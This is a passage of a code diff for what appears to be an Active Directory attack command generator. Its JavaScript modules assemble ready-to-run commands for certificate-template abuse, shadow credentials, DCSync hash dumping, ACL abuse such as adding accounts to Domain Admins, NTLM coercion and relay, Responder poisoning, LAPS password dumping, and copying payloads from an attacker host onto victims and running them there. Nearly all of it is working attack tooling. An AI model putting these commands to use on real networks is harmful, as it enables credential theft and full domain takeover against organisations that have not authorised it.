+let attacker_upn=`${f.user||"attacker"}@${d}`;
+return[fc(f),
+`# Prerequisite: GenericWrite on victim account '${victim}'`,``,
+`# Step 1: Change victim UPN to your attacker UPN (cert will map to victim)`,
+`bloodyAD -H ${dc} -d ${d} ${ba(f)} set object '${victim}' userPrincipalName -v '${attacker_upn}'`,``,
+`# Step 2: Request cert as yourself (now maps to victim account)`,
+`certipy req ${a} -ca '${ca_n}' -template '${tpl}' -dc-ip ${dc}`,
+`# Output: ${f.user||"attacker"}.pfx`,``,
+`# Step 3: Revert victim UPN immediately`,
+`bloodyAD -H ${dc} -d ${d} ${ba(f)} set object '${victim}' userPrincipalName -v '${e.vic_mail||victim+"@"+d}'`,``,
+`# Step 4: Authenticate as victim`,
+`certipy auth -pfx '${f.user||"attacker"}.pfx' -dc-ip ${dc} -domain ${d}`
+].join("\n");}},
+
+"esc15-full":{label:"ESC15 — EKUwu (CVE-2024-49019)",
+tip:"V1 templates skip Application Policy validation in CSR. Inject Client Auth EKU into a Server Auth template request.",
+extra:[
+{id:"ca",type:"tx",label:"CA name",desc:"CA name from certipy find — flagged as ESC15",ph:"corp-CA"},
+{id:"tpl",type:"tx",label:"V1 template",desc:"Schema V1 template — WebServer is a common target. V1 templates skip Application Policy checks",ph:"WebServer"},
+{id:"vic",type:"tx",label:"impersonate UPN",desc:"UPN to embed in cert — will authenticate as this user",ph:"Administrator@corp.local"}
+],
+build(f,e){let d=f.domain;if(!d)return er("domain");let dc=f.dc;if(!dc)return er("DC IP");let a=ca(f);
+let vic=e.vic||`Administrator@${d}`;let vl=vic.split("@")[0].toLowerCase();
+return[fc(f),
+`# Step 1: Request cert with injected Client Authentication Application Policy`,
+`certipy req ${a} -ca '${e.ca||"corp-CA"}' -template '${e.tpl||"WebServer"}' -upn '${vic}' -application-policies 'Client Authentication' -dc-ip ${dc}`,
+`# Output: ${vl}.pfx`,``,
+`# Step 2: Authenticate`,
+`certipy auth -pfx '${vl}.pfx' -dc-ip ${dc} -domain ${d}`
+].join("\n");}},
+
+"shadow-full":{label:"Shadow Credentials",
+tip:"Add Key Credential to target (msDS-KeyCredentialLink). Authenticate via PKINIT to get NT hash. Requires WriteProperty on target.",
+extra:[
+{id:"tgt",type:"tx",label:"target account",desc:"sAMAccountName to add shadow cred to — DC$ for DC takeover, user account for impersonation",ph:"DC01$"}
+],
+build(f,e){let d=f.domain;if(!d)return er("domain");let dc=f.dc;if(!dc)return er("DC IP");
+let tgt=e.tgt||"DC01$",tl=tgt.replace("$","").toLowerCase();
+return[
+`# SHADOW CREDENTIALS FULL CHAIN`,
+`# Prerequisite: WriteProperty on msDS-KeyCredentialLink of '${tgt}'`,``,
+`# Step 1: Add Key Credential to target`,
+`bloodyAD -H ${dc} -d ${d} ${ba(f)} add shadowCredentials '${tgt}'`,
+`# Output: ${tl}.pfx (certificate + private key)`,``,
+`# Step 2: Authenticate via PKINIT — get NT hash`,
+`certipy auth -pfx '${tl}.pfx' -dc-ip ${dc} -domain ${d}`,
+`# Output: NT hash + ${tl}.ccache`,``,
+`# Step 3a: DCSync with NT hash`,
+`impacket-secretsdump '${d}/${tgt}' -hashes aad3b435b51404eeaad3b435b51404ee:<NT_HASH> -dc-ip ${dc} -just-dc-ntlm`,``,
+`# Step 3b: Or Kerberos DCSync`,
+`export KRB5CCNAME=${tl}.ccache`,
+`impacket-secretsdump -k -no-pass '${d}/${tgt}'@${f.dch||f.dc||"DC_HOSTNAME"}`,``,
+`# Step 4: Cleanup — remove shadow credential`,
+`bloodyAD -H ${dc} -d ${d} ${ba(f)} remove shadowCredentials '${tgt}'`
+].join("\n");}},
+
+"relay-esc8":{label:"relay — standalone",
+tip:"Just the certipy relay command. Use when you have your own coercion setup. Pair with any coercion tool.",
+extra:[
+{id:"ca_ip",type:"tx",label:"-target CA IP",desc:"IP of server running AD CS web enrollment on port 80",ph:"192.168.1.20"},
+{id:"ca_name",type:"tx",label:"-ca CA name",desc:"CA name — optional but ensures correct CA is targeted",ph:"corp-CA"},
+{id:"tpl",type:"tx",label:"-template",desc:"Certificate template to request — DomainController for DC relays",ph:"DomainController"},
+{id:"iface",type:"tx",label:"-interface (bind IP)",desc:"IP to bind relay listener on — defaults to all interfaces",ph:"0.0.0.0"}
+],
+build(f,e){let ca_ip=e.ca_ip||f.dc;if(!ca_ip)return er("CA server IP");
+let fl=`-target 'http://${ca_ip}'`;if(e.ca_name)fl+=` -ca '${e.ca_name}'`;if(e.tpl)fl+=` -template '${e.tpl}'`;if(e.iface)fl+=` -interface ${e.iface}`;
+return`certipy relay ${fl}`;}},
+}},
+
+"bloodyad":{label:"BloodyAD",mods:{
+"genericall":{label:"add genericAll — full control",
+tip:"Grant GenericAll on any AD object. Requires WriteDacl on the object. -H flag is host, not hash.",
+extra:[
+{id:"tgt",type:"tx",label:"target sAMAccountName",desc:"Object receiving the rights — sAMAccountName, DN, or SID",ph:"targetuser"},
+{id:"trustee",type:"tx",label:"trustee (gets rights)",desc:"Who receives GenericAll — your attacker account",ph:"attacker_user"}
+],
+build(f,e){if(!f.domain)return er("domain");if(!f.dc)return er("DC IP");
+return`bloodyAD -H ${f.dc} -d ${f.domain} ${ba(f)} add genericAll '${e.tgt||"targetuser"}' '${e.trustee||f.user||"attacker"}'`;}},
+
+"rbcd":{label:"add rbcd — RBCD delegation",
+tip:"IMPORTANT — argument order: SERVICE_ACCOUNT then TARGET_COMPUTER. SERVICE gains delegation rights ON TARGET.",
+extra:[
+{id:"svc",type:"tx",label:"service account (EVILPC$)",desc:"Your controlled machine account — gains delegation rights to impersonate users on the target",ph:"EVILPC$"},
+{id:"tgt",type:"tx",label:"target computer (DC01$)",desc:"The computer being attacked — EVILPC$ will be able to delegate on this machine",ph:"DC01$"}
+],
+build(f,e){if(!f.domain)return er("domain");if(!f.dc)return er("DC IP");if(!e.svc)return er("service account (EVILPC$)");if(!e.tgt)return er("target computer (DC01$)");
+return`bloodyAD -H ${f.dc} -d ${f.domain} ${ba(f)} add rbcd '${e.svc}' '${e.tgt}'`;}},
+
+"shadowcreds":{label:"add shadowCredentials",
+tip:"Write Key Credential to target's msDS-KeyCredentialLink. Then certipy auth to get NT hash via PKINIT.",
+extra:[
+{id:"tgt",type:"tx",label:"target sAMAccountName",desc:"Account to add shadow cred to — DC$ for DC takeover, user account for impersonation",ph:"DC01$"}
+],
+build(f,e){if(!f.domain)return er("domain");if(!f.dc)return er("DC IP");
+return`bloodyAD -H ${f.dc} -d ${f.domain} ${ba(f)} add shadowCredentials '${e.tgt||"DC01$"}'`;}},
+
+"dcsync":{label:"add dcsync — grant DCSync rights",
+tip:"Grant DS-Replication-Get-Changes-All on domain object. Then run secretsdump/DCSync to dump all hashes.",
+extra:[
+{id:"trustee",type:"tx",label:"trustee sAMAccountName",desc:"Account receiving DCSync rights — your attacker account",ph:"attacker_user"}
+],
+build(f,e){if(!f.domain)return er("domain");if(!f.dc)return er("DC IP");
+return`bloodyAD -H ${f.dc} -d ${f.domain} ${ba(f)} add dcsync '${e.trustee||f.user||"attacker"}'`;}},
+
+"groupmember":{label:"add groupMember",
+tip:"Add user to group. Requires WriteMembers or GenericAll on the group object.",
+extra:[
+{id:"grp",type:"tx",label:"group sAMAccountName",desc:"Target group — exact sAMAccountName e.g. 'Domain Admins'",ph:"Domain Admins"},
+{id:"mem",type:"tx",label:"member to add",desc:"Account to add — your attacker account or controlled account",ph:"attacker_user"}
+],
+build(f,e){if(!f.domain)return er("domain");if(!f.dc)return er("DC IP");
+return`bloodyAD -H ${f.dc} -d ${f.domain} ${ba(f)} add groupMember '${e.grp||"Domain Admins"}' '${e.mem||f.user||"attacker"}'`;}},
+
+"setpassword":{label:"set password — force reset",
+tip:"Force-reset user password. Requires WriteDACL, GenericAll, or ForceChangePassword on the target.",
+extra:[
+{id:"tgt",type:"tx",label:"target sAMAccountName",desc:"User whose password to reset",ph:"victimuser"},
+{id:"np",type:"tx",label:"new password",desc:"New password — must meet domain complexity requirements",ph:"Hacked123!"}
+],
+build(f,e){if(!f.domain)return er("domain");if(!f.dc)return er("DC IP");
+return`bloodyAD -H ${f.dc} -d ${f.domain} ${ba(f)} set password '${e.tgt||"targetuser"}' '${e.np||"Hacked123!"}'`;}},
+
+"setowner":{label:"set owner",
+tip:"Change owner of AD object. Requires WriteOwner. Owner implicitly has WriteDACL — path to full control.",
+extra:[
+{id:"tgt",type:"tx",label:"target object",desc:"Object to take ownership of — sAMAccountName or DN",ph:"targetuser"},
+{id:"own",type:"tx",label:"new owner",desc:"New owner — your attacker account, gains implicit WriteDACL",ph:"attacker_user"}
+],
+build(f,e){if(!f.domain)return er("domain");if(!f.dc)return er("DC IP");
+return`bloodyAD -H ${f.dc} -d ${f.domain} ${ba(f)} set object '${e.tgt||"targetuser"}' owner -v '${e.own||f.user||"attacker"}'`;}},
+
+"addcomputer":{label:"add computer account",
+tip:"Add machine account. Hostname WITHOUT $ — bloodyAD adds it. MachineAccountQuota default is 10.",
+extra:[
+{id:"cn",type:"tx",label:"computer hostname (no $)",desc:"Machine account name without $ — bloodyAD appends it automatically",ph:"EVILPC"},
+{id:"cp",type:"tx",label:"password",desc:"Password for new machine account — needed for RBCD getTGT and getST steps",ph:"Passw0rd!"}
+],
+build(f,e){if(!f.domain)return er("domain");if(!f.dc)return er("DC IP");
+return`bloodyAD -H ${f.dc} -d ${f.domain} ${ba(f)} add computer '${e.cn||"EVILPC"}' '${e.cp||"Passw0rd!"}'`;}},
+
+"get-writable":{label:"get writable objects",
+tip:"List all AD objects your user can write to. Good ACL recon without BloodHound.",
+extra:[],
+build(f,e){if(!f.domain)return er("domain");if(!f.dc)return er("DC IP");
+return`bloodyAD -H ${f.dc} -d ${f.domain} ${ba(f)} get writable`;}},
+
+"uac-asrep":{label:"enable ASREPRoasting (UAC)",
+tip:"Set DONT_REQ_PREAUTH on target. Then run GetNPUsers to grab AS-REP hash. Requires write on userAccountControl.",
+extra:[
+{id:"tgt",type:"tx",label:"target sAMAccountName",desc:"Account to enable ASREPRoasting on — then run GetNPUsers against this account",ph:"targetuser"}
+],
+build(f,e){if(!f.domain)return er("domain");if(!f.dc)return er("DC IP");
+return`bloodyAD -H ${f.dc} -d ${f.domain} ${ba(f)} add uac '${e.tgt||"targetuser"}' -f DONT_REQ_PREAUTH`;}},
+}},
+
+"coercion":{label:"Coercion + Relay",mods:{
+"petitpotam":{label:"PetitPotam — MS-EFSRPC",
+tip:"Coerce NTLM auth via MS-EFSRPC. Unauthenticated mode works on unpatched DCs (pre-KB5005413).",
+extra:[
+{id:"pipe",type:"tx",label:"-pipe",desc:"Named pipe: lsarpc (most reliable, rarely blocked), efsr (original), samr, lsass, netlogon",ph:"lsarpc"},
+{id:"noauth",type:"cb",main:"unauthenticated mode",desc:"No credentials — works on unpatched DCs. Requires authenticated mode on patched DCs"}
+],
+build(f,e){let lh=f.lhost;if(!lh)return er("attacker IP (LHOST)");let t=f.target||f.dc;if(!t)return er("target IP");
+let pip=e.pipe||"lsarpc";
+if(e.noauth)return`python3 PetitPotam.py -pipe ${pip} ${lh} ${t}`;
+return`python3 PetitPotam.py -u '${f.user||""}' -p '${f.pass||""}' -d '${f.domain||""}' -pipe ${pip} ${lh} ${t}`;}},
+
+"coercer":{label:"Coercer — multi-protocol",
+tip:"Tests and exploits multiple coercion protocols. --scan checks without coercing — useful safe recon mode.",
+extra:[
+{id:"scan",type:"cb",main:"--scan (check only, no coerce)",desc:"Scan for available coercion methods without triggering — safe recon"},
+{id:"proto",type:"tx",label:"--filter-protocol",desc:"Target one protocol: MS-EFSRPC, MS-DFSNM, MS-FSRVP, MS-RPRN, MS-TSCH",ph:"MS-EFSRPC"}
+],
+build(f,e){let t=f.target||f.dc;if(!t)return er("target IP");let lh=f.lhost||"LHOST";
+let fl=`-u '${f.user||""}' -p '${f.pass||""}' -d '${f.domain||""}' -t ${t} -l ${lh}`;if(e.scan)fl+=" --scan";if(e.proto)fl+=` --filter-protocol-name ${e.proto}`;
+return`python3 Coercer.py coerce ${fl}`;}},
+
+"dfscoerce":{label:"DFSCoerce — MS-DFSNM",
+tip:"Coerce via MS-DFSNM. Use when MS-EFSRPC is patched. No unauthenticated mode available.",
+extra:[],
+build(f,e){let lh=f.lhost;if(!lh)return er("attacker IP (LHOST)");let t=f.target||f.dc;if(!t)return er("target IP");
+return`python3 dfscoerce.py -d '${f.domain||""}' -u '${f.user||""}' -p '${f.pass||""}' ${lh} ${t}`;}},
+
+"printerbug":{label:"printerbug — MS-RPRN",
+tip:"SpoolSample via MS-RPRN SpoolService. Requires Print Spooler running on target. Authenticated only.",
+extra:[],
+build(f,e){let lh=f.lhost;if(!lh)return er("attacker IP (LHOST)");let t=f.target||f.dc;if(!t)return er("target IP");
+return`python3 printerbug.py '${ia(f)}'@${t} ${lh}`;}},
+
+"nxc-coerce-scan":{label:"nxc coerce_plus — scan",
+tip:"Scan target(s) for all 5 coercion methods (PetitPotam, DFSCoerce, PrinterBug, ShadowCoerce, MSEven) without triggering. LISTENER defaults to localhost — no traffic sent. Run this first before committing to a method.",
+extra:[
+{id:"net",type:"tx",label:"target/network",desc:"Single IP, hostname, or CIDR range — nxc scans all at once, major advantage over standalone scripts",ph:"192.168.1.0/24"},
+{id:"noauth",type:"cb",main:"unauthenticated (empty creds)",desc:"Try without credentials — PetitPotam works unauthenticated on unpatched DCs"}
+],
+build(f,e){let t=e.net||f.target||f.dc;if(!t)return er("target IP or network");
+if(e.noauth)return`nxc smb ${t} -u '' -p '' -M coerce_plus`;
+return`nxc smb ${t} ${na(f)} -M coerce_plus`;}},
+
+"nxc-coerce-plus":{label:"nxc coerce_plus — coerce",
+tip:"Trigger coercion via a specific method or all at once. ALWAYS=true tries every method without stopping on first success. Methods: PetitPotam (MS-EFSRPC), DFSCoerce (MS-DFSNM), PrinterBug (MS-RPRN), ShadowCoerce (MS-FSRVP, patched), MSEven (not useful for relay — runs as LOCAL SERVICE). Short aliases: pe=PetitPotam, pr=PrinterBug, dfs=DFSCoerce.",
+extra:[
+{id:"net",type:"tx",label:"target/network",desc:"Single IP, hostname, or CIDR — nxc handles bulk targeting automatically",ph:"192.168.1.0/24"},
+{id:"method",type:"tx",label:"METHOD (blank = All)",desc:"Specific method: PetitPotam, DFSCoerce, PrinterBug, ShadowCoerce, MSEven — or leave empty for All",ph:"PetitPotam"},
+{id:"always",type:"cb",main:"ALWAYS=true (try all methods)",desc:"Do NOT stop after first successful coercion — tries every method. Good for surveying what's available"},
+{id:"noauth",type:"cb",main:"unauthenticated (empty creds)",desc:"No credentials — PetitPotam works unauthenticated on unpatched DCs (pre-KB5005413)"}
+],
+build(f,e){let t=e.net||f.target||f.dc;if(!t)return er("target IP or network");
+let lh=f.lhost;if(!lh)return er("attacker IP (LHOST)");
+let opts=`LISTENER=${lh}`;if(e.method)opts+=` METHOD=${e.method}`;if(e.always)opts+=` ALWAYS=true`;
+if(e.noauth)return`nxc smb ${t} -u '' -p '' -M coerce_plus -o ${opts}`;
+return`nxc smb ${t} ${na(f)} -M coerce_plus -o ${opts}`;}},
+
+"nxc-relay-list":{label:"nxc — generate relay target list",
+tip:"Find all hosts without SMB signing — these are valid ntlmrelayx targets. Output feeds directly into ntlmrelayx -tf. Always run this before setting up a relay.",
+extra:[
+{id:"net",type:"tx",label:"network/target",desc:"Subnet CIDR to scan for hosts without SMB signing",ph:"192.168.1.0/24"},
+{id:"out",type:"tx",label:"output file",desc:"Path to save the target list — feed directly to ntlmrelayx -tf",ph:"/tmp/relay.txt"}
+],
+build(f,e){let t=e.net||f.target;if(!t)return er("network or target");
+return`nxc smb ${t} ${na(f)} --gen-relay-list ${e.out||"/tmp/relay.txt"}\n# Then use with ntlmrelayx:\n# impacket-ntlmrelayx -tf ${e.out||"/tmp/relay.txt"} --smb2support`;}},
+
+"ntlmrelayx":{label:"ntlmrelayx — NTLM relay",
+tip:"Relay NTLM to LDAP/SMB/ADCS. --smb2support required for modern Windows. Run with Responder -A or a coercion tool.",
+extra:[
+{id:"tgt",type:"tx",label:"-t relay target",desc:"Single target — protocol://IP e.g. ldap://DC, smb://server, http://CA_IP. Use -tf for multiple",ph:"ldap://192.168.1.10"},
+{id:"tf",type:"tx",label:"-tf targets file",desc:"File of relay targets — generate with 'nxc smb SUBNET --gen-relay-list /tmp/relay.txt'",ph:"/tmp/targets.txt"},
+{id:"cmd",type:"tx",label:"-c OS command (SMB relay)",desc:"Execute OS command on relayed SMB targets — only works when SMB relay succeeds",ph:"whoami"},
+{id:"smb2",type:"cb",main:"--smb2support",desc:"Enable SMB2/3 — REQUIRED for Windows 10/Server 2016+ targets"},
+{id:"adcs",type:"cb",main:"--adcs (relay to ADCS)",desc:"Request certificate from AD CS for the relayed account — pairs with ESC8"},
+{id:"tpl",type:"tx",label:"--template (ADCS)",desc:"Certificate template when relaying to ADCS — DomainController for DC certs",ph:"DomainController"},
+{id:"lootdir",type:"tx",label:"--lootdir",desc:"Directory to save captured hashes and certs",ph:"/tmp/loot"},
+{id:"nohttp",type:"cb",main:"--no-http-server",desc:"Disable built-in HTTP server — use when Responder handles HTTP poisoning"},
+{id:"nosmb",type:"cb",main:"--no-smb-server",desc:"Disable built-in SMB server — use when Responder handles SMB capture"}
+],
+build(f,e){let fl="--smb2support";if(e.tgt)fl=`-t ${e.tgt}`;else if(e.tf)fl=`-tf ${e.tf} --smb2support`;else fl=`-tf /tmp/targets.txt --smb2support`;
+if(e.smb2&&!fl.includes("smb2"))fl+=" --smb2support";if(e.adcs)fl+=" --adcs";if(e.tpl)fl+=` --template ${e.tpl}`;if(e.cmd)fl+=` -c "${e.cmd}"`;if(e.lootdir)fl+=` --lootdir ${e.lootdir}`;if(e.nohttp)fl+=" --no-http-server";if(e.nosmb)fl+=" --no-smb-server";
+return`impacket-ntlmrelayx ${fl}`;}},
+
+"responder":{label:"Responder — LLMNR/NBT-NS",
+tip:"Poison LLMNR/NBT-NS/MDNS to capture NTLMv2. Use -A (analyse only) when running alongside ntlmrelayx to avoid conflicts.",
+extra:[
+{id:"iface",type:"tx",label:"-I interface",desc:"Network interface to listen on — check with 'ip a'",ph:"eth0"},
+{id:"wr",type:"cb",main:"-w (WPAD rogue proxy)",desc:"Start rogue WPAD proxy — captures browser proxy auth credentials"},
+{id:"bf",type:"cb",main:"-b (basic auth)",desc:"Return HTTP 401 Basic challenge — captures cleartext credentials"},
+{id:"analyse",type:"cb",main:"-A (analyse only — use with relay)",desc:"Log requests but do NOT poison. Use this when ntlmrelayx is running alongside"}
+],
+build(f,e){let fl=`-I ${e.iface||"eth0"}`;if(e.wr)fl+=" -w";if(e.bf)fl+=" -b";if(e.analyse)fl+=" -A";
+return`sudo responder ${fl}`;}},
+}},
+
+"laps":{label:"LAPS Abuse",mods:{
+"nxc-laps":{label:"dump LAPS via nxc",
+tip:"Reads ms-Mcs-AdmPwd (Legacy LAPS) or msLAPS-Password (Windows LAPS) via LDAP. Requires ReadLAPSPassword right.",
+extra:[
+{id:"comp",type:"tx",label:"--computer filter (opt)",desc:"Filter to specific computer — leave empty to dump all computers you have rights on",ph:"WORKSTATION01"}
+],
+build(f,e){if(!f.dc)return er("DC IP");
+return`nxc ldap ${f.dc} ${na(f)} -M laps${e.comp?` --computer '${e.comp}'`:""}`;}},
+
+"ldapsearch-laps":{label:"ldapsearch — raw LAPS query",
+tip:"Direct LDAP query for LAPS password attributes. Works when nxc module fails. Reads both Legacy and Windows LAPS.",
+extra:[
+{id:"filter",type:"tx",label:"computer filter (opt)",desc:"Filter by computer CN — leave empty for all computers you can read",ph:"WORKSTATION01"}
+],
+build(f,e){let d=f.domain;if(!d)return er("domain");let dc=f.dc;if(!dc)return er("DC IP");
+let dn=d.split(".").map(x=>"DC="+x).join(",");let flt=e.filter?`(cn=${e.filter})`:"(objectClass=computer)";
+return`ldapsearch -x -H ldap://${dc} -D '${f.user||"user"}@${d}' -w '${f.pass||""}' -b '${dn}' '${flt}' ms-Mcs-AdmPwd msLAPS-Password`;}},
+}},
+
+"bloodhound":{label:"BloodHound",mods:{
+"bloodhound-py":{label:"bloodhound-python — remote",
+tip:"Remote AD collection from Linux. Outputs JSON for BloodHound CE. -c All for complete dataset.",
+extra:[
+{id:"col",type:"tx",label:"-c collection",desc:"Methods: All (everything), DCOnly (stealthy, DC queries only), Session, ACL, Group, Trusts",ph:"All"},
+{id:"zip",type:"cb",main:"--zip",desc:"Package as ZIP — required format for BloodHound CE import"},
+{id:"ns",type:"tx",label:"--nameserver",desc:"DNS server — use DC IP if internal DNS not reachable from attacker",ph:"192.168.1.10"},
+{id:"dnstcp",type:"cb",main:"--dns-tcp",desc:"Use TCP DNS instead of UDP — use if UDP port 53 is blocked"}
+],
+build(f,e){let d=f.domain;if(!d)return er("domain");let dc=f.dc;if(!dc)return er("DC IP");
+let c=f.aes?`-aesKey ${f.aes}`:f.hash?`-hashes ${f.hash}`:`-p '${f.pass||""}'`;
+let fl=`-c ${e.col||"All"} -d ${d} -dc ${dc}`;if(e.zip)fl+=" --zip";if(e.ns)fl+=` --nameserver ${e.ns}`;if(e.dnstcp)fl+=" --dns-tcp";
+return`bloodhound-python -u '${f.user||"user"}' ${c} ${fl}`;}},
+
+"rusthound":{label:"rusthound — fast collector",
+tip:"Faster BloodHound collection in Rust. Same output format as bloodhound-python, significantly faster on large domains.",
+extra:[
+{id:"col",type:"tx",label:"-c collection",desc:"Same methods as bloodhound-python — All, DCOnly, etc.",ph:"All"},
+{id:"zip",type:"cb",main:"--zip",desc:"Package as ZIP for BloodHound CE import"}
+],
+build(f,e){let d=f.domain;if(!d)return er("domain");let dc=f.dc;if(!dc)return er("DC IP");
+let c=f.aes?`--aes '${f.aes}'`:f.hash?`--hash '${f.hash}'`:`-p '${f.pass||""}'`;
+return`rusthound -u '${f.user||"user"}@${d}' ${c} -d ${d} -i ${dc}${e.col?` -c ${e.col}`:""}${e.zip?" --zip":""}`;}},
+}},
+
+"pywhisker":{label:"PyWhisker",mods:{
+"add":{label:"add shadow credential",
+tip:"Write msDS-KeyCredentialLink. Generates PFX for certipy auth. Requires WriteProperty on target's msDS-KeyCredentialLink.",
+extra:[
+{id:"tgt",type:"tx",label:"--target account",desc:"Account to add Key Credential to — DC$ for DC takeover",ph:"DC01$"},
+{id:"fn",type:"tx",label:"--filename prefix",desc:"Output file prefix — generates .pfx and .pem files",ph:"/tmp/sc"}
+],
+build(f,e){if(!f.domain)return er("domain");if(!f.dc)return er("DC IP");
+let c=f.hash?`-H ${f.hash.includes(":")?f.hash.split(":")[1]:f.hash}`:`-p '${f.pass||""}'`;
+return`pywhisker -d ${f.domain} -u '${f.user||"user"}' ${c} --dc-ip ${f.dc} --target '${e.tgt||"DC01$"}' --action add --filename ${e.fn||"/tmp/sc"}`;}},
+
+"list":{label:"list shadow credentials",
+tip:"List all Key Credential entries on target — check before adding to avoid duplicates.",
+extra:[
+{id:"tgt",type:"tx",label:"--target",desc:"Account to list Key Credentials on",ph:"DC01$"}
+],
+build(f,e){if(!f.domain)return er("domain");if(!f.dc)return er("DC IP");
+let c=f.hash?`-H ${f.hash.includes(":")?f.hash.split(":")[1]:f.hash}`:`-p '${f.pass||""}'`;
+return`pywhisker -d ${f.domain} -u '${f.user||"user"}' ${c} --dc-ip ${f.dc} --target '${e.tgt||"DC01$"}' --action list`;}},
+
+"clear":{label:"clear shadow credentials",
+tip:"Remove ALL Key Credential entries from target. Use for cleanup after attack.",
+extra:[
+{id:"tgt",type:"tx",label:"--target",desc:"Account to clear all Key Credentials from",ph:"DC01$"}
+],
+build(f,e){if(!f.domain)return er("domain");if(!f.dc)return er("DC IP");
+let c=f.hash?`-H ${f.hash.includes(":")?f.hash.split(":")[1]:f.hash}`:`-p '${f.pass||""}'`;
+return`pywhisker -d ${f.domain} -u '${f.user||"user"}' ${c} --dc-ip ${f.dc} --target '${e.tgt||"DC01$"}' --action clear`;}},
+}},
+
+"filetransfer":{label:"File Transfer",mods:{
+"python-http":{label:"python HTTP server",
+tip:"Serve files from attacker machine. Victim downloads via wget, curl, or PowerShell IWR.",
+extra:[
+{id:"port",type:"tx",label:"port",desc:"Port to listen on — 80 avoids specifying port on victim, 8080 if 80 is taken",ph:"80"},
+{id:"dir",type:"tx",label:"directory",desc:"Directory to serve — change to wherever your payloads are",ph:"/tmp/srv"}
+],
+build(f,e){return`cd ${e.dir||"."} && python3 -m http.server ${e.port||"80"}`;}},
+
+"impacket-smb":{label:"impacket smbserver",
+tip:"Quick SMB share on attacker. No install needed on victim — uses built-in copy or UNC path.",
+extra:[
+{id:"sn",type:"tx",label:"share name",desc:"SMB share name — use in \\\\LHOST\\sharename UNC paths on victim",ph:"share"},
+{id:"dir",type:"tx",label:"directory",desc:"Local directory to share — place payloads here",ph:"/tmp/srv"},
+{id:"smb2",type:"cb",main:"-smb2support",desc:"Enable SMB2/3 — REQUIRED for Windows 10/Server 2016+ victims"},
+{id:"uauth",type:"tx",label:"-username (opt)",desc:"Require auth — add username to restrict share access",ph:""},
+{id:"pauth",type:"tx",label:"-password (opt)",desc:"Password for optional auth",ph:""}
+],
+build(f,e){let fl=e.smb2?" -smb2support":"";if(e.uauth)fl+=` -username ${e.uauth}`;if(e.pauth)fl+=` -password ${e.pauth}`;
+return`impacket-smbserver ${e.sn||"share"} ${e.dir||"/tmp/srv"}${fl}\n\n# On victim (Windows):\ncopy \\\\\\\\${f.lhost||"LHOST"}\\\\${e.sn||"share"}\\\\file.exe C:\\\\Windows\\\\Temp\\\\\n\\\\\\\\${f.lhost||"LHOST"}\\\\${e.sn||"share"}\\\\file.exe  # execute directly`;}},
+
+"wget-curl":{label:"wget / curl (Linux victim)",
+tip:"Download file to a Linux victim machine.",
+extra:[
+{id:"url",type:"tx",label:"URL",desc:"Full URL to download from attacker HTTP server",ph:"http://10.10.14.1/file"},
+{id:"out",type:"tx",label:"save as",desc:"Local path to save the file on the victim",ph:"/tmp/file"}
+],
+build(f,e){let u=e.url||`http://${f.lhost||"LHOST"}/file`,o=e.out||"/tmp/file";
+return`wget -q ${u} -O ${o}\n# or:\ncurl -fsSL ${u} -o ${o}`;}},
+
+"smbclient-xfer":{label:"smbclient get / put",
+tip:"Transfer via SMB. get: remote→local. put: local→remote. Hash PTH supported with --pw-nt-hash.",
+extra:[
+{id:"rfile",type:"tx",label:"remote file",desc:"Windows path on target — use double backslash",ph:"\\\\Windows\\\\Temp\\\\file.exe"},
+{id:"lfile2",type:"tx",label:"local file",desc:"Linux path on attacker machine",ph:"/tmp/file.exe"},
+{id:"put",type:"cb",main:"upload (put) instead of get",desc:"Upload local file to remote — reverses direction"},
+{id:"net",type:"tx",label:"share name",desc:"Share to connect to — C$, ADMIN$, or custom share",ph:"C$"}
+],
+build(f,e){let t=f.target||f.dc;if(!t)return er("target IP");let sh=e.net||"C$";
+let cred=f.hash?`-U '${f.user||""}%${f.hash.includes(":")?f.hash.split(":")[1]:f.hash}' --pw-nt-hash`:`-U '${f.domain?f.domain+"\\\\":""}${f.user||""}%${f.pass||""}'`;
+if(e.put)return`smbclient //${t}/${sh} ${cred} -c 'put "${e.lfile2||"/tmp/file"}" "${e.rfile||"\\\\Temp\\\\file"}"'`;
+return`smbclient //${t}/${sh} ${cred} -c 'get "${e.rfile||"\\\\file"}" "${e.lfile2||"/tmp/file"}"'`;}},
+
+"mount-cifs":{label:"mount SMB share",
+tip:"Mount remote SMB share as local filesystem. vers=3.0 for modern Windows, vers=1.0 for legacy (often disabled).",
+extra:[
+{id:"mp",type:"tx",label:"mount point",desc:"Local directory to mount at — created if it doesn't exist",ph:"/mnt/smb"},
+{id:"vers",type:"tx",label:"SMB version",desc:"vers=3.0 modern, vers=2.0 for Server 2012-, vers=1.0 legacy (usually disabled)",ph:"3.0"},
+{id:"net",type:"tx",label:"share name",desc:"Share to mount — C$, ADMIN$, SYSVOL, or custom",ph:"C$"}
+],
+build(f,e){let t=f.target||f.dc;if(!t)return er("target IP");let sh=e.net||"C$";
+let cred=`username=${f.user||""},password=${f.pass||""},domain=${f.domain||""},vers=${e.vers||"3.0"}`;
+return`sudo mkdir -p ${e.mp||"/mnt/smb"}\nsudo mount -t cifs //${t}/${sh} ${e.mp||"/mnt/smb"} -o '${cred}'`;}},
+}},
+
+"rbcd-chain":{label:"RBCD Full Chain",mods:{
+"full-chain":{label:"full RBCD chain — all steps",
+tip:"Complete RBCD attack: add computer → set RBCD → getTGT → S4U2Proxy → DCSync. All syntax verified.",
+extra:[
+{id:"cn",type:"tx",label:"attacker computer name (no $)",desc:"New machine account name without $ — use something inconspicuous",ph:"EVILPC"},
+{id:"cp",type:"tx",label:"computer password",desc:"Password for new machine account — needed in steps 3 and 4",ph:"Passw0rd!"},
+{id:"tgt_comp",type:"tx",label:"target computer (with $)",desc:"Computer you are attacking and want SYSTEM on",ph:"DC01$"},
+{id:"spn",type:"tx",label:"SPN",desc:"Service SPN on target — cifs=SMB, ldap=LDAP, host=generic",ph:"cifs/DC01.corp.local"},
+{id:"imp",type:"tx",label:"impersonate user",desc:"Domain user to impersonate — must have access to the target service",ph:"Administrator"}
+],
+build(f,e){let d=f.domain;if(!d)return er("domain");let dc=f.dc;if(!dc)return er("DC IP");
+let u=f.user||"user",p=f.pass||"pass";
+let cred=f.hash?`-hashes ${f.hash.includes(":")?f.hash:`aad3b435b51404eeaad3b435b51404ee:${f.hash}`}`:`-password '${p}'`;
+let cn=e.cn||"EVILPC",cp=e.cp||"Passw0rd!",tgt=e.tgt_comp||"DC01$",spn=e.spn||`cifs/DC01.${d}`,imp=e.imp||"Administrator";
+let ba_auth=f.hash?`-p '${f.hash.includes(":")?f.hash:`aad3b435b51404eeaad3b435b51404ee:${f.hash}`}'`:`-p '${p}'`;
+return[
